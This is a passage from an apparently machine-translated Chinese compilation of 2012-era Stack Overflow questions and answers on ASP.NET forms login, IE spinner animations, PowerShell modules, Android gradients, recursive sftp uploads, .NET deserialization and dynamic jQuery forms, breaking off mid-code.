当我尝试使用我的管理员用户登录时，第一次登录没有问题，但如果我尝试使用任何其他问题登录，我必须通过第二个登录页面登录。

你的第一种形式是这样的：

[http://HOST.com/Login/Login](http://HOST.com/Login/Login)

除了我的数据库管理员用户之外的任何其他用途我必须尝试一次然后获取此网址

[http://HOST.com/Login/Login?ReturnUrl=%2f](http://HOST.com/Login/Login?ReturnUrl=%2f)

重定向并重试，然后它会正确登录。每次都会发生。

这是我的 web.config 中表单部分的表单代码

```
<authentication mode="Forms">
  <forms loginUrl="Login/Login" timeout="200000" slidingExpiration="true">
  </forms>
</authentication>

    <authorization>
      <deny users="?" />
    </authorization> 
```

感谢您的任何建议

登录表单文件：

```
using System;
using System.Web.Mvc;
using System.Web.Security;
using SAMPLE.Models;
using SAMPLE.Helpers;
using System.Web;
using System.Linq;
namespace SAMPLE.Controllers
{
    public class LoginController : Controller
    {
        public ActionResult Login(string username, string password, string returnUrl)
        {
            if (!String.IsNullOrEmpty(username) && !String.IsNullOrEmpty(password))
            {
                if (UserAccount.IsValid(username, password))
                    RedirectFromLoginPage(username, returnUrl);
                else
                    ViewData["LoginMessage"] = "Incorrect username or password.";
            }

            return View();
        }

        public ActionResult Logout()
        {
            FormsAuthentication.SignOut();
            return RedirectToAction("Login", "Login");
        }
        private void RedirectFromLoginPage(string username, string returnUrl)
        {
            FormsAuthentication.SetAuthCookie(username, false);

            var userType = 0;
            var user =  UserAccount.SingleOrDefault(x => x.Username == username.ToLower());
            if(user!=null)
             userType = user.UserType;             

            if (userType == 2)
            {
                Response.Redirect("/Usrmgmt");
            }
            else
            {
                var privileges = SAMPLE.Helpers.SAMPLEContext.Privileges;

                if ((privileges & PrivilegeConstants.Home) == PrivilegeConstants.Home)
                    Response.Redirect("/");
                else if ((privileges & PrivilegeConstants.Budgets) == PrivilegeConstants.Budgets)
                    Response.Redirect("/Budget");

                else if ((privileges & PrivilegeConstants.Estimates) == PrivilegeConstants.Estimates)
                    Response.Redirect("/Estimate");

                else if ((privileges & PrivilegeConstants.EstimageCatalogue) == PrivilegeConstants.EstimageCatalogue)
                    Response.Redirect("/Labour");

                else if ((privileges & PrivilegeConstants.CRM) == PrivilegeConstants.CRM)
                    Response.Redirect("/CRM");

                else if ((privileges & PrivilegeConstants.JobStatus) == PrivilegeConstants.JobStatus)
                    Response.Redirect("/JobStatus");  

                else if ((privileges & PrivilegeConstants.UserManage) == PrivilegeConstants.UserManage)
                    Response.Redirect("/Administration");

                else
                    Response.Redirect("/");
            }
            //}
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:45:08.323

请将您的 web.config 更改为：

```
<authentication mode="Forms">
   <forms loginUrl="~/Login/Login" timeout="2880" protection="All"/>
</authentication> 
```

删除下面的代码，然后重试：

```
<authorization>
  <deny users="?" />
</authorization> 
```

# jquery - 在 IE 中提交动画问题

> ID：10084902
> 
> 赞同：1
> 
> 时间：2012-04-10T07:37:00.167
> 
> 标签：jquery, asp.net, internet-explorer, animated-gif

我以前一直在处理这个问题，但似乎问题又回来了。让我解释。

我有一个网页可以让用户上传一个大文件，之后 ASP.NET 服务器端脚本也可能需要几秒钟来处理它。与此同时，我想在 Web 浏览器中显示加载器/微调器动画，以防止用户再次单击提交按钮。

我使用了以下 JQuery 代码：

```
$('#ButtonImportData').click(function () {
    $('.importSubmitSpinner').css('display', 'inline');
} 
```

这是微调器图像的 HTML：

```
<img src="Graphics/spinner_big.gif" width="28" height="28" class="importSubmitSpinner" alt="Spinner" /> 
```

这是CSS：

```
.importSubmitSpinner
{
    margin: 0px 10px 0px 6px;
    width: 28px;
    height: 28px;
    display: none;
} 
```

spinner_big.gif 是一个带有动画的简单 GIF 文件，用于向用户发出页面正在加载的信号。

上述方法几乎适用于所有浏览器，除了......猜猜哪一个？是的，IE！在 IE 中发生的情况是，在用户单击 ButtonImportData 按钮后，将显示微调器，但动画立即停止，基本上给用户一个错误的指示，表明页​​面已挂起，提示他们再次单击提交 - 与我的相反想做。

我很久以前就停止使用 IE，但显然有大约一半的互联网社区仍在使用它。伙计，人们怎么能使用那块 *&^% 呢？无论如何，这不是一个问题 :) 问题是，如何让这个简单的任务在 IE 中工作并让我的动画真正播放？

PS。我一直在使用 IE 9 或 Windows 7 的当前“网络之美”对其进行测试。

**编辑：**

感谢ShadowScripter，我找到了解决方案。这对我有用：

1 将以下内容添加到 HTML 以确定我们是否在 IE 上运行（因为我们不需要对任何其他 Web 浏览器执行此“破解”）：

```
<![if !IE]>
<script type='text/javascript'>
var bNotIE = 1;
</script>
<![endif]> 
```

2 我们需要给img元素添加ID：

```
<img src="Graphics/spinner_big.gif" width="28" height="28" class="importSubmitSpinner" alt="Spinner" id="imgSpinnerImport" /> 
```

3 然后显示GIF动画：

```
$('#ButtonImportData').click(function () {
    //For "normal" browsers
    $('.importSubmitSpinner').show();

    if (typeof (bNotIE) == 'undefined') {
        //The following must be done only in case of IE
       //NOTE: We need to load the same file but with a different name
       //   because if you don't change the file name it won't work!
        setTimeout('document.images["imgSpinnerImport"].src = "Graphics/spinner_big_ie.gif"', 200);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T10:41:23.693

我似乎无法在任何 IE 版本中复制您的问题。

这是我测试过[的现场示例。](http://jsfiddle.net/HPW9R/)

您的原因可能有很多不同的原因。

*   其他代码可能会干扰
*   GIF 图像有问题
*   客户端计算机；工作量

哦，还有，

你可以使用`.show()`而不是必须做的`.css("display", "inline")`事情。
如果没有指定，JQuery 可以识别元素应该具有的默认显示模式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-21T13:31:14.177

试试这个效果很好...

```
setTimeout(function() {
     ('.out').css("display","none");    
     $('#load').show();         
     return true;
}, 100); 
```

在实际显示加载程序图像之前延迟 100 毫秒。

# powershell - 在 Powershell 中，在单个脚本文件中编写多个函数是一种好习惯吗？

> ID：10084915
> 
> 赞同：3
> 
> 时间：2012-04-10T07:38:32.300
> 
> 标签：powershell, powershell-2.0

有人告诉我使用 powershell 脚本编写多个操作。诸如 Apppool 创建、SQL 更新、文件编辑等操作。

我打算第一次用脚本写这么大的东西。

因此，我想在编写它们之前了解最佳实践。

将所有函数写在一个文件中是一个好习惯吗？

我在想至少 10 个我可能需要编写的函数。假设每个函数可能有 10 行代码。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T07:57:28.737

考虑模块：最简单的格式是清单 ( `.psd1`) 和单个脚本文件 ( `.psm1`)，其中包含所有函数、别名……模块导出（以及任何内部帮助程序）。

在这种情况下，您显然是将多个连接的函数放在一个文件中。即使大部分代码只是点源到脚本模块中，它们在逻辑上仍然存在于一个实体中。

另一方面，在您的路径中使用脚本来执行而无需事先加载会倾向于（根据[阿德里亚诺](https://stackoverflow.com/users/1207195/adriano)对问题的评论）支持一个功能（在脚本范围而不是`function`语句）是有意义的。

因此：没有一个“好的做法”：这完全取决于具体情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T15:45:00.023

务实，真理来自行动，不来自言辞;O)

所以开始，从头开始：

1）您想做的事情是否存在于互联网[EX PoshCode](http://poshcode.org/)上的某个地方（如果有，您可以调整它）

2）想想你的函数（不多）对象：重用代码（用伪代码编写你的算法）

3）使用互联网寻找甚至存在的功能

4) 将所有函数写在与主代码相同的文件中以测试它们。在此阶段，您将发现要添加或删除现有功能和参数的新功能和参数

5) 测试完代码后，将可重用函数（以及它们所依赖的函数）放入一个或多个模块中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T08:00:30.063

我的解决方案是创建一个自定义模块，以后可以在其中添加功能。

您可以将具有所有功能的单个文件保存`mymodule.psm1`在`mymodule`此路径下的文件夹中`$env:psmodulepath`。

然后`add-module mymodule`（或者最好在控制台启动时调用它`$profile`以使其准备就绪）

# cocoa-touch - 读取json并解析

> ID：10084925
> 
> 赞同：-3
> 
> 时间：2012-04-10T07:39:30.167
> 
> 标签：cocoa-touch, uitableview

我在我的问题上寻找答案：

我想读取一个 JSON 文件并在 tableview 中解析它，例如：http: [//i.imgur.com/ProQK.png](http://i.imgur.com/ProQK.png) 这不是问题，但是当用户点击 UITableCell 时，我想显示整个消息，例如：[http ://imgur.com/nxH20.png](http://imgur.com/nxH20.png)

最好的方法是什么？有人可以将我推向正确的方向吗？

我只想显示消息并加载图像等

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:59:21.000

有很多框架可以解析 JSON 数据。我使用[NSJSONSerialization](http://developer.apple.com/library/ios/#documentation/Foundation/Reference/NSJSONSerialization_Class/Reference/Reference.html)来解析我的数据。然后创建一个数组来保存部分数据（从响应字典生成数组，意思是 JSON 字典）。之后为 tableview 的每一行定义一个标题，并在

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{} 
```

委托方法推送一个新视图以显示该标题主题的详细信息。如果您需要更多帮助，请写下

# c# - UriMapper 不工作

> ID：10084926
> 
> 赞同：1
> 
> 时间：2012-04-10T07:39:31.243
> 
> 标签：c#, windows-phone-7, uri

我正在开发 Wp7 应用程序。这里我使用 uriMapper 根据条件将用户引导到起始页面。

条件是

如果他已经注册，他应该直接去mypage2.xaml 如果他没有注册，那么他应该去mypage1.xaml

所以为了解决这个问题，我在 app.xaml 中使用了 UriMapper

```
 <uriMapper:UriMapper x:Name="mapper">
        <uriMapper:UriMapping Uri="/InermediatePage.xaml" />
    </uriMapper:UriMapper> 
```

InermediatePage.xaml 只是一个中间页面，什么都不做。

我在 app.xaml.cs 的构造函数中的代码是 LoadActivePage();

```
 private void LoadActivePage()
    {
        UriMapper mapper = Resources["mapper"] as UriMapper;
        RootFrame.UriMapper = mapper;

        if(ifNotRegistered)
        {
            mapper.UriMappings[0].MappedUri= new Uri("/mypage1.xaml",UriKind.Relative);
        }
        else
        {
            mapper.UriMappings[0].MappedUri= new Uri("/mypage2.xaml",UriKind.Relative);
        }
    } 
```

现在的问题是当我调试时..它工作正常。

但是，当我的应用程序被墓碑化并在模拟器或设备中重新启动应用程序时，它会显示 Inermediatepage.xaml 而不是显示 mypage1.xaml 或 mypage2.xaml

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:31:10.517

您是否查看过 App.xaml.cs 中的激活事件？您可能需要向此事件处理程序添加代码。

# google-maps-api-3 - FF 中的错误 - c[Db] 不是函数

> ID：10084927
> 
> 赞同：0
> 
> 时间：2012-04-10T07:39:31.477
> 
> 标签：google-maps-api-3

我正在尝试在我的网站上使用 Google 地图。我使用此代码

```
 <script type="text/javascript"
    src="https://maps.google.com/maps/api/js?sensor=false">
</script>
<script type="text/javascript">
  function initialize() {
    var latlng = new google.maps.LatLng(-34.397, 150.644);
    var myOptions = {
      zoom: 8,
      center: latlng,
      mapTypeId: google.maps.MapTypeId.ROADMAP
    };
    var map = new google.maps.Map(document.getElementById("map_canvas"),
        myOptions); 
```

所以在 FF 中它会抛出一个错误 c[Db] is not a function ...Db](d);ce=new Ff;c.Yb=new Mf;c.mapTypes=new Sf;c.features=new Af; var e=c.Zb=new... 如何调试或修复此错误？}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T21:45:11.787

您在创建地图时省略了 new-operator，它必须是：

```
var map = new google.maps.Map(document.getElementById(id+'-canvas'), myOptions);
//________^ 
```

# sql-server - 我将安装哪个 SQL Server 产品？

> ID：10084928
> 
> 赞同：-2
> 
> 时间：2012-04-10T07:39:45.800
> 
> 标签：sql-server, ssis, windows-xp, installation

我想在windows XP系统下学习SSIS包，我应该安装哪个版本的SQL Server？

我已经下载了 SQL Server 2008R2，但是安装失败，错误信息说：

SQL Server 2008R2 setup100.exe 和 setuppatch.exe 无法在此模式下运行。如果您正在运行 setup100.exe，请改为启动 setup.exe....

谢谢，玲

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:48:56.800

Windows XP 不是windows server 系统，所以只能安装与企业版功能相同的sql server developer edition，但license 仅限于开发用途。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:54:38.787

SQL Server 2008 R2有[软件和硬件要求，有](http://msdn.microsoft.com/en-us/library/ms143506%28v=sql.105%29.aspx)[版本支持的功能](http://msdn.microsoft.com/en-us/library/cc645993%28v=sql.100%29.aspx)。使用这些资源，您可以为您选择合适的版本。

# java - 无法从支持 bean 方法返回 arraylist

> ID：10084930
> 
> 赞同：0
> 
> 时间：2012-04-10T07:40:03.613
> 
> 标签：java, javascript, netbeans, xhtml

我想从支持bean中的arraylist的值初始化javascript函数（在xhtml中）中的数组。我能够单独访问arraylist元素

```
s2='#{sel_bean.retarr1(0)}';
alert(s2); 
```

其中 retarr1() 是 bean 中的一个方法，它返回 arraylist 的第 i 个元素，但是当我试图在 for 循环中执行它时，它只返回第 0 个元素。

```
for(i=0;i<s1;i++)
{
  alert(i);
  alert('#{sel_bean.retarr1(i)}');
  s2='#{sel_bean.retarr1(i)}';
  distarr.push(s2);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T11:26:20.137

*假设您正在使用 JSF 从行间读取*

您可以使用 jsf 创建数组推送操作`ui:repeat`：

```
<ui:repeat value="#{msel_bean.retarr1}" var="item">
  <h:outputText value="distarr.push(#{item})" />
</ui:repeat> 
```

另一种变体是用 初始化数组`ui:repeat`：

```
var distarray = [
     <ui:repeat value="#{msel_bean.retarr1}" var="item">
       <h:outputText value="'#{item}', " />
     </ui:repeat>
]; 
```

请注意，您只会得到一个字符串数组。

# cakephp - 如何从 .pot 文件中获取 .po 文件

> ID：10084931
> 
> 赞同：6
> 
> 时间：2012-04-10T07:40:08.653
> 
> 标签：cakephp, cakephp-2.0, po

我使用 cakePHP 2.0 并使用控制台工具创建一个 .../app/locale/default.pot 。现在，我想让我的网站翻译成多种语言。我在 cakephp 烹饪书 (http://book.cakephp.org/1.2/en/view/162/Internationalizing-Your-Application) 中阅读了有关国际化的段落。

我将 default.pot 文件复制到

*   .../app/locale/eng/LC_MESSAGES/default.pot
*   .../app/locale/fre/LC_MESSAGES/default.pot
*   .../app/locale/pol/LC_MESSAGES/default.pot
*   ...

并使用 utf-8 文本编辑器（如 gedit）输入 tranalations 字符串。而且......我的网站根本没有被翻译。

我注意到 AppController 可能会实现一些代码来更改 Configure::write('Config.language', some_three_letters_language)，因为配置没有改变，我已经实现了一些非常简单的代码。

```
// in AppController
public function beforeFilter() {
        Configure::write('Config.language', 'fre');
} 
```

为什么翻译函数总是返回它的参数而不是 .pot 文件中的翻译字符串（在视图中，__('Something') -answers-> 'Something'）？

我发现.pot文件没有被翻译成.po。如何使用 REHL 或 CentOS 获取这些 .po 文件（无法获取名称中带有 po 或 poeditor 的任何合适的数据包）？

感谢您的回答。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-10T07:49:39.943

.pot 和 .po 文件是相同的文件格式。.pot 代表“采购订单*模板*”。不同之处在于您应该使用此模板文件并将其提供给您的翻译人员，他们将生成翻译后的 .po 文件。.pot 文件是几个本地化 .po 文件的模板。请参阅[http://www.gnu.org/software/gettext/manual/gettext.html#Files](http://www.gnu.org/software/gettext/manual/gettext.html#Files)。

换句话说，只需将 .pot 重命名为 .po 即可。
在正确的 gettext 工作流程中，有[`msginit`](http://www.gnu.org/software/gettext/manual/gettext.html#msginit-Invocation)执行此操作的工具，它还将为所选语言环境设置一些标题为正确的值。

# android - 如何在android中显示从上到下的渐变效果

> ID：10084932
> 
> 赞同：20
> 
> 时间：2012-04-10T07:40:21.283
> 
> 标签：android

谁能告诉如何在android中从上到下显示渐变效果。谁能提供示例

谢谢

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2012-04-10T07:46:14.740

在您的 dawable 文件夹名称中创建一个 xml 文件`gradient_bg.xml`

```
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android">
    <gradient 
        android:startColor="#000" 
        android:endColor="#fff"
        android:angle="90"
     />
</shape> 
```

并将其设置为您的背景`View`。

```
android:background="@drawable/gradient_bg" 
```

或者

```
setBackgroundResource(R.drawable.gradient_bg); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-10T07:47:21.567

```
<shape xmlns:android="http://schemas.android.com/apk/res/android" >

    <gradient

        android:angle="90"
        android:type="linear"
        android:startColor="#FFFFFF"
        android:endColor="#000000" />

</shape> 
```

在这里，如果您将角度设置为`270`起始颜色将出现在底部，而结束颜色将出现在顶部如果您将角度设置为`90`它将反转

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-08-23T08:54:27.380

您可以使用自定义视图来执行此操作。有了这个解决方案，它就完成了您项目中所有颜色的渐变形状：

```
class GradientView(context: Context, attrs: AttributeSet) : View(context, attrs) {

    // Properties
    private val paint: Paint = Paint()
    private val rect = Rect()

    //region Attributes
    var start: Int = Color.WHITE
    var end: Int = Color.WHITE
    //endregion

    override fun onSizeChanged(w: Int, h: Int, oldw: Int, oldh: Int) {
        super.onSizeChanged(w, h, oldw, oldh)
        // Update Size
        val usableWidth = width - (paddingLeft + paddingRight)
        val usableHeight = height - (paddingTop + paddingBottom)
        rect.right = usableWidth
        rect.bottom = usableHeight
        // Update Color
        paint.shader = LinearGradient(0f, height.toFloat(), 0f, 0f,
                start, end, Shader.TileMode.CLAMP)
        // ReDraw
        invalidate()
    }

    override fun onDraw(canvas: Canvas) {
        super.onDraw(canvas)
        canvas.drawRect(rect, paint)
    }

} 
```

我还使用这个自定义视图创建了一个开源项目**[GradientView ：](https://github.com/lopspower/GradientView)**

[https://github.com/lopspower/GradientView](https://github.com/lopspower/GradientView)

```
implementation 'com.mikhaellopez:gradientview:1.1.0' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-22T01:18:19.653

在android中以透明方式显示从上到下的渐变效果：

1.  在 res/drawable 文件夹中创建一个名为 gradient_transparent.xml 的新 XML 文件并添加以下代码。

.

```
 <?xml version="1.0" encoding="utf-8"?>
    <shape xmlns:android="http://schemas.android.com/apk/res/android">
        <gradient
            android:startColor="#90000000"
            android:endColor="#00ffffff"
            android:angle="90"
            />
    </shape> 
```

在 XML 布局文件中

```
<LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_alignParentBottom="true"
                    android:background="@drawable/gradient_transparent"
                    android:orientation="vertical"
                    android:padding="@dimen/spacing_middle">
</LinearLayout> 
```

# java - 如何在单独的视图中创建新控制台

> ID：10084935
> 
> 赞同：2
> 
> 时间：2012-04-10T07:40:31.587
> 
> 标签：java, eclipse-plugin

我使用以下代码创建了一个新控制台。

```
this.console = new IOConsole(name, null);
IConsole[] consoles = new IConsole[1];
consoles[0] = this.console ;
ConsolePlugin.getDefault().getConsoleManager()
                .addConsoles(consoles);
IOConsoleOutputStream consoleStream = this.console.newOutputStream();
consoleStream.write("Printing in console.."); 
```

我已经创建了 3 个与上面相同的新控制台。

但实际上我不想将我的新控制台页面之一添加到现有控制台。我想创建新的控制台视图，它应该显示这些控制台消息。如何获得单独的控制台视图而不是添加现有的控制台管理器。因为我想分离我自己的控制台视图之一，而不是其他控制台。

是否可以创建新视图并将一个控制台附加到该视图。任何人都可以帮我得到这个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T13:09:38.057

最近两天一直在为这个问题苦苦挣扎。无论如何，我自己找到了解决方案。仍然存在一些问题。
我想分享我得到的。

我刚刚创建了新视图。该视图类应该实现*IConsoleView*（当然，扩展*IViewPart*）。

在*createPatrControl()*中，我添加了以下代码。

```
public void createPartControl(Composite parent) {
  IWorkbenchPage page = PlatformUI.getWorkbench().getActiveWorkbenchWindow()
    .getActivePage();
  IViewReference ref = page.findViewReference(IConsoleConstants.ID_CONSOLE_VIEW);
  IOConsole  console = createConsole(); // here create new console

  // this will ad console page to corresponding view                
        IPageBookViewPage pageBook = targetConsole.createPage(this);
        try {
            pageBook.init(new PageSite((IViewSite) ref.getView(true).getSite()));
        } catch (PartInitException e) {
            e.printStackTrace();
        }
        pageBook.createControl(parent);

} 
```

但我认为，这里遗漏了一些东西。

实际上，我希望在该视图类之外完成此操作。创建控制台后，我想以编程方式创建新视图并添加如下所示，

```
// here that new view should be get and passed into createPage()
PageBookViewPage pageBook = targetConsole.createPage(IConsoleView); 
```

# .net - 动态对象分配和属性访问

> ID：10084936
> 
> 赞同：0
> 
> 时间：2012-04-10T07:40:35.373
> 
> 标签：.net, dynamic

我正在开发一个 wcf 客户端应用程序。在这里，我有 7 个不同的要求。

有没有办法像下面的演示代码那样做？

```
T obj =new anyobject ;

obj=DeSeriableXMLToObject<typeof(obj)>(string);

if(obj.property1=="200")
{
} 
```

我的反序列化功能如下：

```
public static T DeSeriableXMLToObject<T>(string xml)
    {
// process for derisialising
} 
```

我认为，我们可以通过 dot net 中的动态来做到这一点。但我对这个动态概念很陌生。谁能帮帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T03:21:43.427

我已经解决了我的问题，如下所示。

```
dynamic obj= new anyobject();

obj=DeSeriableXMLToObject(xml,obj);

if(obj.property1==200)
{
} 
```

我的反序列化功能是这样的；

```
dynamic DeSeriableXMLToObject(string xml,dynamic obj1) { 
//
Byte[] _bytes = (new UTF8Encoding()).GetBytes(xml);

DataContractSerializer datacontractser = new DataContractSerializer(obj.GetType ());

        object deserialized = _datacontractser .ReadObject(new MemoryStream(_bytes));

        return deserialized;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T08:00:44.307

反序列化将类似于：

```
var serializer = new XmlSerializer(typeof(T));
T obj = (T)serializer.Deserialize(new StringReader(value)); 
```

可以通过多种方式设置属性。首选是在类型之间有一些共性，也许是接口：

```
interface IFoo {
    string property1 { get; }
} 
```

和：

```
T DeSeriableXMLToObject<T>(string value) where T : IFoo {
    var serializer = new XmlSerializer(typeof(T));
    T obj = (T)serializer.Deserialize(new StringReader(value));        
    if(obj.property1 == "200") { ...}
    return obj;
} 
```

另一种选择是反射或`dynamic`：

```
T DeSeriableXMLToObject<T>(string value) {
    var serializer = new XmlSerializer(typeof(T));
    dynamic obj = serializer.Deserialize(new StringReader(value));        
    if(obj.property1 == "200") { ...}
    return obj;
} 
```

顺便提一句; `DeSeriableXMLToObject<T>`看起来......有点时髦的名字。我可以建议只是`Deserialize<T>`或`DeserializeXml<T>`吗？

# linux - 如何在 linux 上使用 sftp 上传包含其他文件夹的整个文件夹？

> ID：10084941
> 
> 赞同：54
> 
> 时间：2012-04-10T07:40:46.297
> 
> 标签：linux, recursion, upload, console, sftp

我试过`put -r directory/*`了，它只上传文件而不是文件夹。给我错误，不能`Couldn't canonicalise`。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：225
> 
> 时间：2014-01-10T20:55:54.773

对于实际上想要直接回答这个问题的人（而不是被告知使用 sftp 以外的东西）......

```
put -r local/path/to/directoryName 
```

上传的目录必须已经存在于服务器的工作目录中，因此您可能需要先创建它。

```
mkdir directoryName 
```

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-04-10T10:06:28.417

[在这里](http://www.hypexr.org/linux_scp_help.php)您可以找到有关如何使用复制目录的详细说明`scp`。在你的情况下，它会是这样的：

```
$ scp -r foo your_username@remotehost.edu:/some/remote/directory/bar 
```

这会将目录“foo”从本地主机复制到远程主机的目录“bar”。这`-r`是-递归复制整个目录。

您也可以使用`rcp`类似的语法。它们之间的唯一区别是`scp`使用安全外壳和`rcp`使用远程外壳。

**顺便说一句**，当 sftp 服务器无法访问命令中提到的文件/目录时，会出现您提到的“无法规范化”错误。

**更新**：对于想要`put`具体使用的用户，请参考 Ben Thielker 的回答。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-05-26T09:00:04.270

```
sftp> mkdir source
sftp> put -r source
 Uploading source/ to /home/myself/source
 Entering source/
 source/file1
 source/file2 
```

[![在此处输入图像描述](../Images/adc9b48544ea44c1d84eaa06d8ac215b.png)](https://i.stack.imgur.com/X1qh1.png)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-10-23T13:54:32.707

如果你在使用 sftp 时遇到问题，你可以使用 ncftp For centos

```
yum install ncftp 
```

递归复制整个目录

```
ncftpput -R -v -u username -P 21 ftp.server.dev /remote-path/ /localdirectory 
```

* * *

## 回答 #5

> 赞同：-11
> 
> 时间：2012-04-10T08:06:36.580

改为使用`scp`。它也使用 SSH 并且可以轻松处理递归。

# ruby-on-rails - 根据Ruby中的条件将不同的参数传递给方法调用

> ID：10084945
> 
> 赞同：0
> 
> 时间：2012-04-10T07:41:10.977
> 
> 标签：ruby-on-rails, ruby

这是我的函数的代码，我在其中调用`new`

```
def create_person_detail_from_registration(type, registration, registration_detail)
  person_detail = type.constantize.new(
    :email        => registration.email_2,
    :phone_1      => registration_detail.phone_1,
    :phone_2      => registration_detail.phone_2,
    :phone_3      => registration_detail.phone_3,
    :phone_4      => registration_detail.phone_4,
    :phone_5      => registration_detail.phone_5,
    :phone_6      => registration_detail.phone_6,
    :phone_7      => registration_detail.phone_7,
    :address_1    => registration_detail.address_1,
    :address_2    => registration_detail.address_2,
    :city         => registration_detail.city,
    :state        => registration_detail.state,
    :postal_code  => registration_detail.postal_code,
    :country      => registration_detail.country
  )
  return person_detail
end 
```

现在问题取决于`type`具有什么值，`:email`设置为`registration.email_2`或`registration.email`。当然，这样做的一种方法是将整个代码编写两次，并由`if-elsif`语句包围。但我只想知道，是否有更聪明、更优雅的方式来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:47:27.863

只需将条件添加到 value 中。

```
:email        => (type==1 ? registration.email_2 :  registration.email), 
```

# ios - Iphone 游戏，完整版/精简版还是应用内？

> ID：10084947
> 
> 赞同：1
> 
> 时间：2012-04-10T07:41:15.563
> 
> 标签：ios, in-app-purchase

我很快将在 Apples AppStore 上发布我的第一款游戏，这是一款塔防游戏。我的问题是，最好的选择是发布两个版本，一个精简版和一个完整版，还是拥有一个带有应用内购买的版本来解锁游戏的其余部分（6-20 级）？

首要任务是遵循苹果的指导方针（我不希望它被拒绝）。第二个优先事项是财务（最赚钱）最后，这是最容易维护的（我相信如果你做对了这两种方法几乎一样容易维护）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T18:40:31.573

我认为许多开发人员都面临过这个问题，而且我相信，应用内购买会给您带来很多好处，并且确实是正确的方法。

1.  您不会拆分下载。您的应用程序的所有购买都算作唯一一次。这让您在 App Store 中的排名更高。所有的评论。所有的星星。那正是你想要的。
2.  选择免费应用程序的用户切换到付费应用程序更容易。只按一个按钮与删除旧按钮并安装新应用程序不同。
3.  如果保存用户设置和进度对您的应用程序很重要，您只需将其保存在 NSUserDefaults 中并在升级后继续使用。想象一下，如果您有两个单独的应用程序，您需要做什么。
4.  越狱者。他们在 Installous 中下载破解的应用程序。不是你的。
5.  您只需要维护一个应用程序。

当然，您需要在您的应用程序中实现应用内购买，并且仍然存在 iAP 破解程序，但是，就我而言，选择是显而易见的。

# javascript - 诺基亚地图 (v2.2)：mousedown/mouseup 问题

> ID：10084952
> 
> 赞同：1
> 
> 时间：2012-04-10T07:41:48.293
> 
> 标签：javascript, here-api

我正在尝试通过单次鼠标移动在地图上创建一个矩形（例如在 Photoshop、GIMP 等中）。我删除了行为组件并添加了侦听器：

```
map.addListener("mousemove", onMouseMove);              
map.addListener("mousedown", onDragStart);              
map.addListener("mouseup", onDragEnd); 
```

但是当我按下鼠标左键然后在地图上移动鼠标时，不会发生“鼠标移动”事件。此外，当我释放按钮时，不会发生“鼠标向上”事件。

但是，当我单击鼠标左键时，“鼠标向下”和“鼠标向上”事件同时发生。

这是正常行为吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T07:22:55.227

我在这里得到了答案：http: [//www.developer.nokia.com/Community/Discussion/showthread.php?234571 -Problem-with-mousedown-mouseup-events&p=889270#post889270](http://www.developer.nokia.com/Community/Discussion/showthread.php?234571-Problem-with-mousedown-mouseup-events&p=889270#post889270)

# ajax - JQuery - 如何提交动态创建的表单？

> ID：10084956
> 
> 赞同：3
> 
> 时间：2012-04-10T07:42:00.620
> 
> 标签：ajax, jquery, dynamic, submit

提交动态创建的表单时遇到问题。

这就是我在选中单选按钮后创建表单的方式：

```
$(document).ready(function(){

     $('input[name$="rad-tweet"]').click(function(){

      var radio_value = $(this).val();

      if(radio_value==='hash') {
      $('#mainform2').empty();
           $('#mainform2').remove();
        $('#radio-buttons').after('<form  action="" id="mainform" method="POST" ></form>');
         $('#mainform').append('<label class="label" for="Location" >&nbsp;&nbsp;Location</label>'+
                '<input class ="text-box" type="text" name="Location" id="Location"/>'+
                '<label class="label" for="Since" >Since</label>'+
                '<input  class ="text-box" type="text" name="Since" id="Since" />'+

                '<select name="Time" id="Time" style="width:80px;">'+
                    '<option value="MINUTE">Minute(s)</option>'+
                    '<option value="HOUR">Hour(s)</option>'+
                    '<option value="DAY">Day(s)</option>'+
                    '<option value="WEEK">Week</option>'+
                '</select>'+
                '<label class="label" for="Time" >Ago&nbsp;</label>'+
                 '<label class="label" for="Limit" >Up to</label>'+

                '<input class ="text-box" type="text" name="Limit" id="Limit" />'+
               '<label class="label" for="Limit" >Results&nbsp;</label>'+
                '<input class ="submit-button" type="submit" id="submitButton" value="Get Hashtags" style="width:95px;" />');

      }
      else if(radio_value==='trends') {
          $('#mainform').empty();
           $('#mainform').remove();
          $('#radio-buttons').after('<form  action="" id="mainform2" method="POST" ></div>');
          $('#mainform2').append('<label class="label" for="Location" >&nbsp;&nbsp;Location&nbsp;</label>'+
                '<input class ="text-box" type="text" name="Location" id="Location"/>&nbsp;&nbsp;'+
